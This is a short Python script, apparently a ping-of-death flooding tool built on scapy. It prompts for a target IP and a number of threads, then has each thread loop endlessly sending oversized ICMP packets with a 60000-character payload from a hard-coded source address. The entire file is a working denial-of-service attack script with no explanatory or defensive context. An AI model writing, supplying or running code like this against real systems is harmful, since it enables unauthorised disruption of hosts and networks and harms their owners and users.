from ast import While
from scapy.all import *
import threading

ip = input("IP: ")
thr = int(input("Thread: "))

def PoD (ip, i):
    while True:
        print('Thread:', i)
        SOURCE_IP="192.168.2.102"
        TARGET_IP=ip
        MESSAGE="T"
        NUMBER_PACKETS=5

        pingOFDeath = IP(src=SOURCE_IP, dst=TARGET_IP)/ICMP()/(MESSAGE*60000)
        send(NUMBER_PACKETS*pingOFDeath)


thrList = list()
for i in range(thr):
    thrPoD = threading.Thread(target = PoD, args = (ip, i,))
    thrList.append(thrPoD)
    thrPoD.start()
